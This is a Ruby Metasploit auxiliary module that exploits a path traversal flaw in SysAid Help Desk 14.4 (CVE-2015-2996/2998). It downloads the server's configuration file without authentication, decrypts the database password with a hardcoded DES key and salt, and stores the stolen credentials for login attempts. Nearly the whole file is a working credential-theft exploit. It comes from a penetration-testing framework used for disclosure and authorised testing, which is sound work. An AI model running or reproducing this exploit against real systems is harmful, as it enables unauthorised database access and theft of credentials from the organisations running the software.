##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'openssl'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SysAid Help Desk Database Credentials Disclosure',
        'Description' => %q{
          This module exploits a vulnerability in SysAid Help Desk that allows an unauthenticated
          user to download arbitrary files from the system. This is used to download the server
          configuration file that contains the database username and password, which is encrypted
          with a fixed, known key. This module has been tested with SysAid 14.4 on Windows and Linux.
        },
        'Author' => [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2015-2996'],
          ['CVE', '2015-2998'],
          ['URL', 'https://seclists.org/fulldisclosure/2015/Jun/8'],
          ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt']
        ],
        'DisclosureDate' => '2015-06-03',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptPort.new('RPORT', [true, 'The target port', 8080]),
        OptString.new('TARGETURI', [ true, 'SysAid path', '/sysaid']),
      ]
    )
  end

  def decrypt_password(ciphertext)
    salt = [-87, -101, -56, 50, 86, 53, -29, 3].pack('c*')
    cipher = OpenSSL::Cipher.new('DES')
    base_64_code = Rex::Text.decode_base64(ciphertext)
    cipher.decrypt
    cipher.pkcs5_keyivgen 'inigomontoya', salt, 19

    plaintext = cipher.update base_64_code
    plaintext << cipher.final
    plaintext
  end

  def run
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(datastore['TARGETURI'], 'getGfiUpgradeFile'),
        'vars_get' => {
          'fileName' => '../conf/serverConf.xml'
        }
      })
    rescue Rex::ConnectionRefused
      fail_with(Failure::Unreachable, "#{peer} - Could not connect.")
    end

    if res && res.code == 200 && res.body.to_s.bytesize != 0
      username = %r{<dbUser>(.*)</dbUser>}.match(res.body.to_s)
      encrypted_password = %r{<dbPassword>(.*)</dbPassword>}.match(res.body.to_s)
      database_url = %r{<dbUrl>(.*)</dbUrl>}.match(res.body.to_s)
      database_type = %r{<dbType>(.*)</dbType>}.match(res.body.to_s)

      unless username && encrypted_password && database_type && database_url
        fail_with(Failure::Unknown, "#{peer} - Failed to obtain database credentials.")
      end

      username = username.captures[0]
      encrypted_password = encrypted_password.captures[0]
      database_url = database_url.captures[0]
      database_type = database_type.captures[0]
      password = decrypt_password(encrypted_password[6..encrypted_password.length])
      credential_core = report_credential_core({
        password: password,
        username: username
      })

      matches = %r{(\w*):(\w*)://(.*)/(\w*)}.match(database_url)
      if matches
        begin
          db_address = matches.captures[2]
          if database_url['localhost'] == 'localhost'
            db_port = db_address[(db_address.index(':') + 1)..(db_address.length - 1)].to_i
            db_address = rhost
          else
            if db_address.index(':')
              db_address = db_address[0, db_address.index(':')]
              db_port = db_address[db_address.index(':')..(db_address.length - 1)].to_i
            else
              db_port = 0
            end
            db_address = Rex::Socket.getaddress(db_address, true)
          end
          database_login_data = {
            address: db_address,
            service_name: database_type,
            protocol: 'tcp',
            port: db_port,
            workspace_id: myworkspace_id,
            core: credential_core,
            status: Metasploit::Model::Login::Status::UNTRIED
          }
          create_credential_login(database_login_data)
        # Skip creating the Login, but tell the user about it if we cannot resolve the DB Server Hostname
        rescue SocketError
          fail_with(Failure::Unknown, 'Could not resolve database server hostname.')
        end

        print_good("Stored SQL credentials #{username}:#{password} for #{matches.captures[2]}")
        return
      end
    else
      fail_with(Failure::NotVulnerable, "#{peer} - Failed to obtain database credentials, response was: #{res ? res.code : 'unknown'}")
    end
  end

  def report_credential_core(cred_opts = {})
    # use a basic core only since this credential is not known valid for service it was obtained from.
    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      private_type: :password,
      private_data: cred_opts[:password],
      username: cred_opts[:username]
    }
    create_credential(credential_data)
  end
end
